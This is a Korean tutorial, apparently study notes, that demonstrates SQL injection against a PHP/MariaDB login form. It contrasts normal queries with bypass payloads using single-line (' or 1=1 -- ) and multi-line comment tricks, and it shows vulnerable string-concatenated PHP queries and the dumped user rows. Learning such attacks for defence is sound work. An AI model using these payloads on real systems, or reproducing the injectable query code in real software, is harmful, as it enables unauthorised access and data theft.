## **SQL injection**
SQL injection 은 기존 SQL의 쿼리문에 새로운 쿼리가 삽입되면서 새로운 쿼리가 만들어져서 애플리케이션을 취약하게 만드는 공격이다.

---

### **1. 정상적인 쿼리**

**1) 로그인 성공 케이스**
  . 아이디: admin
  . 비밀번호: 111111
  . 쿼리 결과   
    - 로그인 성공: `SELECT * FROM mymember WHERE userid = 'admin' and userpw = password('111111')`

```sql
MariaDB [test]> SELECT * FROM mymember WHERE userid = 'admin' and userpw = password('111111')\G
*************************** 1. row ***************************
      no: 1
  userid: admin
  userpw: *FD571203974BA9AFE270FE62151AE967ECA5E0AA
username: admin
 regdate: 2026-04-07 09:26:48
   phone: 010-1111-2222
   email: admin@server.com
1 row in set (0.00 sec)
```
```php
$query = "SELECT * FROM $TBNAME WHERE userid = '$userid' and userpw = password('$userpw') ";
$result = mysqli_query($connect, $query);
  :
$num = mysqli_num_rows($result);
echo $num;  // 1

if($num) {
    로그인 성공  <--
} else {
    로그인 실패
}
```

**2) 로그인 실패 케이스**
  . 아이디: admin
  . 비밀번호: 1234
  . 쿼리 결과   
    - 로그인 실패: `SELECT * FROM mymember WHERE userid = 'admin' and userpw = password('1234')`

```sql
MariaDB [test]> SELECT * FROM mymember WHERE userid = 'admin' and userpw = password('1234')\G
Empty set (0.00 sec)
```
```php
$query = "SELECT * FROM $TBNAME WHERE userid = '$userid' and userpw = password('$userpw') ";
$result = mysqli_query($connect, $query);
  :
$num = mysqli_num_rows($result);
echo $num;  // 0

if($num) {
    로그인 성공
} else {
    로그인 실패  <--
}
```

### **2. SQLi로 조작된 쿼리 (단일행 주석 `--` 우회)**

  . 아이디: `' or 1=1 -- `
  . 비밀번호: `1`
  . 쿼리 결과
    - 로그인 성공

```text
      SELECT * FROM mymember WHERE userid = '' or 1=1 -- ' and userpw = password('1')
                                                      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                                                (주석처리됨)

    - SELECT * FROM mymember WHERE userid = '' or 1=1
                                   ~~~~~~~~~~~    ~~~
                                      false       true
                                            true

    - SELECT * FROM mymember WHERE true;
    - SELECT * FROM mymember WHERE 1;
```

```sql
MariaDB [user1DB]> SELECT * FROM mymember WHERE true;
```

### **3. 코드 변경 및 다중행 주석(`/* */`) 우회 기법**

**1) 코드 변경**
  . 기존 코드
```php
$query = "SELECT * FROM $TBNAME WHERE userid = '' or 1=1 -- ' and userpw = password('1') ";
```
  . 변경된 코드 (줄바꿈 적용)
```php
$query = "SELECT * FROM $TBNAME 
          WHERE userid = '$userid' 
          and 
          userpw = password('$userpw') ";
```

**2) SQLi로 조작된 쿼리 (다중행 주석 `/* */` 활용)**
변경된 코드처럼 줄바꿈이 적용되어 단일행 주석(`--`)으로 뒤의 코드를 무력화할 수 없을 때 사용한다.

  . 아이디: `' or 1=1 /* `   
  . 비밀번호: `*/-- `

```php
// PHP에 주입된 결과
$query = "SELECT * FROM $TBNAME 
          WHERE userid = '' or 1=1 /*' 
          and 
          userpw = password('*/-- ') ";
```

```sql
MariaDB [test]> SELECT * FROM mymember
    -> WHERE userid = '' or 1=1/*'
    /*> and
    /*> userpw = password('*/-- ');
    -> ;
+----+--------+-------------------------------------------+----------+---------------------+---------------+------------------+
| no | userid | userpw                                    | username | regdate             | phone         | email            |
+----+--------+-------------------------------------------+----------+---------------------+---------------+------------------+
|  1 | admin  | *FD571203974BA9AFE270FE62151AE967ECA5E0AA | admin    | 2026-04-07 09:26:48 | 010-1111-2222 | admin@server.com |
|  2 | mrhong | *A0C1808B1A47CECD5C161FEE647F5427F4EB6F98 | honggd   | 2026-04-07 09:26:49 | 010-2222-3333 | mrhong@naver.com |
+----+--------+-------------------------------------------+----------+---------------------+---------------+------------------+
2 rows in set (0.00 sec)
```
